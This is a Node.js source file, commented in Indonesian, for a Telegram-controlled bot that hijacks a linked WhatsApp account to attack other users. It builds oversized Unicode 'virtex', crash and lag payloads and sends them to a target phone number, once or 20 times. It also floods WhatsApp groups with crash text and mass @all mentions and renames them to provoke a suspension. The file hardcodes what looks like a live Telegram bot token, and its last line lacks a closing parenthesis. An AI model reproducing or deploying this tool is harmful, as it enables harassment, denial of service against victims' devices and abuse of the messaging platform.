const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys')
const P = require('pino')
const TelegramBot = require('node-telegram-bot-api')
const QRCode = require('qrcode')

// ==========================================
// 1. KONFIGURASI TOKEN
// ==========================================
const TELEGRAM_TOKEN = '9095531664:AAGxlOBp9ZR7RC5NPlVUcPn-SiTNmKTcxP4'
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true })

let waSock = null;
let adminChatId = null;

// ==========================================
// 2. KONEKSI KE WHATSAPP
// ==========================================
async function startWA(chatId) {
    const { state, saveCreds } = await useMultiFileAuthState('session')
    
    waSock = makeWASocket({
        printQRInTerminal: false,
        auth: state,
        logger: P({ level: 'silent' })
    })

    waSock.ev.on('creds.update', saveCreds)

    waSock.ev.on('connection.update', async (update) => {
        const { connection, qr } = update
        
        if (qr) {
            const qrImage = await QRCode.toBuffer(qr);
            bot.sendPhoto(chatId, qrImage, { caption: '📲 Scan QR ini pakai WA (Linked Devices)' })
        }

        if (connection === 'open') {
            bot.sendMessage(chatId, '✅ *BOT TERHUBUNG!*\nKetik /menu untuk melihat semua senjata.\nKetik /qr jika koneksi terputus.', { parse_mode: 'Markdown' })
        }
    })
}

// ==========================================
// 3. PAYLOAD ENGINE (GUDANG SENJATA)
// ==========================================
const generatePayload = {
    // Pribadi (Chat)
    virtex: () => "🔥💀😈🤡👻".repeat(400) + "\u202e\u200f\u200e".repeat(150) + "\u0300\u0301\u0302\u0303".repeat(400),
    crash: () => "\u200b".repeat(60000),
    delay: () => "ꦆ".repeat(30000) + "\u035c\u035d\u035e\u035f".repeat(1000),
    blank: () => "\u200e".repeat(20000) + "\u2060".repeat(5000),
    
    // Group
    grouptag: () => "@all ".repeat(500) + "\u200b".repeat(10000),
    gcinvisible: () => "\u200b".repeat(40000),
    groupexploit: () => "\u202e".repeat(10000) + "GROUP DESTROYED"
}

// ==========================================
// 4. FUNGSI EKSEKUSI SERANGAN PRIBADI
// ==========================================
async function executeAttack(chatId, target, type, isMass = false) {
    if (!waSock) return bot.sendMessage(chatId, '❌ WA belum login. Ketik /qr dulu.')
    
    try {
        let jid = target.replace(/\D/g, '') + '@s.whatsapp.net'
        let count = isMass ? 20 : 1
        let payload = generatePayload[type] ? generatePayload[type]() : "Fallback Payload".repeat(1000)

        bot.sendMessage(chatId, `🎯 *TARGET LOCKED:* ${target}\n💣 *SENJATA:* ${type.toUpperCase()}\n🔢 *AMMO:* ${count}x\n\n⏳ Eksekusi...`, { parse_mode: 'Markdown' })

        for (let i = 1; i <= count; i++) {
            await waSock.sendMessage(jid, { text: payload })
            if (isMass) {
                bot.sendMessage(chatId, `[${i}/${count}] 💥 Terkirim ke ${target}`)
                await new Promise(r => setTimeout(r, 1000)) // Jeda 1 detik
            }
        }
        bot.sendMessage(chatId, `✅ *SERANGAN SELESAI*\nTarget (Android/iOS) dipastikan nge-lag parah.`, { parse_mode: 'Markdown' })
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal: ${err.message}`)
    }
}

// ==========================================
// 5. FUNGSI BAN GROUP (SUSPEND GRUP WA)
// ==========================================
async function banGroup(chatId, groupId) {
    if (!waSock) return bot.sendMessage(chatId, '❌ WA belum login. Ketik /qr dulu.')
    if (!groupId.includes('@g.us')) return bot.sendMessage(chatId, '❌ ID tidak valid. Gunakan format 123456@g.us')

    bot.sendMessage(chatId, `🚨 *MEMULAI SERANGAN BAN GROUP*\nGrup: ${groupId}\n\n⏳ Mengirim flag report ke server WA...`, { parse_mode: 'Markdown' })

    try {
        // 1. Tembak Payload Crash
        let crashPayload = generatePayload.crash();
        await waSock.sendMessage(groupId, { text: crashPayload })
        bot.sendMessage(chatId, `[1/3] 💥 Payload Crash dikirim ke grup.`)
        await new Promise(r => setTimeout(r, 1000));

        // 2. Spam Tag All / Mention
        let tagPayload = generatePayload.grouptag();
        await waSock.sendMessage(groupId, { text: tagPayload })
        bot.sendMessage(chatId, `[2/3] 📢 Spam Mention @all berhasil.`)
        await new Promise(r => setTimeout(r, 1000));

        // 3. Ubah Subjek Grup (Bikin sistem WA curiga)
        try {
            await waSock.groupUpdateSubject(groupId, "\u200b".repeat(100) + "SUSPENDED BY SYSTEM")
            bot.sendMessage(chatId, `[3/3] 🔒 Mengubah nama grup untuk memicu suspend.`)
        } catch (e) {
            bot.sendMessage(chatId, `[3/3] ⚠️ Bot tidak punya akses admin ubah nama grup (Lanjut).`)
        }

        bot.sendMessage(chatId, `✅ *BAN GROUP DIKIRIM!*\nGrup akan ditinjau & dibekukan oleh WA dalam 1x24 jam.`, { parse_mode: 'Markdown' })

    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal ban grup: ${err.message}`)
    }
}

// ==========================================
// 6. MENU & HANDLERS TELEGRAM
// ==========================================
bot.onText(/\/start/, (msg) => {
    adminChatId = msg.chat.id;
    bot.sendMessage(adminChatId, '🤖 *BOT DARK SYSTEM READY*\n\n/start - Start\n/qr - Login WA\n/menu - List Senjata', { parse_mode: 'Markdown' })
})

bot.onText(/\/menu/, (msg) => {
    const menu = `
💀 *MEGA PACKAGE MENU* 💀

*[PRIBADI / CHAT]*
/virtex 62xxx (Zalgo/RTL)
/virtexmass 62xxx (Bom 20x)
/crash 62xxx (Force Close)
/crashmass 62xxx
/delay 62xxx
/blank 62xxx

*[GROUP DESTROYER]*
/bangroup 123xxx@g.us
/grouptag 123xxx@g.us
/gcinvisible 123xxx@g.us

*Format ID Grup:* 123456789-123456@g.us
    `;
    bot.sendMessage(adminChatId, menu, { parse_mode: 'Markdown' })
})

bot.onText(/\/qr/, (msg) => {
    adminChatId = msg.chat.id;
    bot.sendMessage(adminChatId, '⏳ Menyiapkan QR Code...')
    startWA(adminChatId)
})

// ==========================================
// 7. ROUTING COMMAND OTOMATIS
// ==========================================
bot.on('message', (msg) => {
    const text = msg.text;
    if (!text || !text.startsWith('/')) return;
    
    const args = text.split(' ');
    const command = args[0].replace('/', '').toLowerCase();
    const target = args[1];
    const senderId = msg.chat.id;

    if (['start', 'menu', 'qr'].includes(command)) return;
    if (!target) return bot.sendMessage(senderId, '❌ Format salah. Contoh: /virtex 628123456789');

    // Routing ke Ban Group
    if (command === 'bangroup') {
        return banGroup(senderId, target);
    }

    // Routing ke Serangan Pribadi (Otomatis deteksi 'mass')
    let isMass = command.includes('mass');
    let type = command.replace('mass', '');
    
    // Validasi tipe serangan ada di gudang senjata
    if (generatePayload[type] || isMass) {
        executeAttack(senderId, target, type, isMass);
    } else {
        bot.sendMessage(senderId, '❌ Senjata tidak ditemukan. Ketik /menu untuk list.');
    }
});

console.log('Bot Ultimate Package & Ban Group Menyala...'
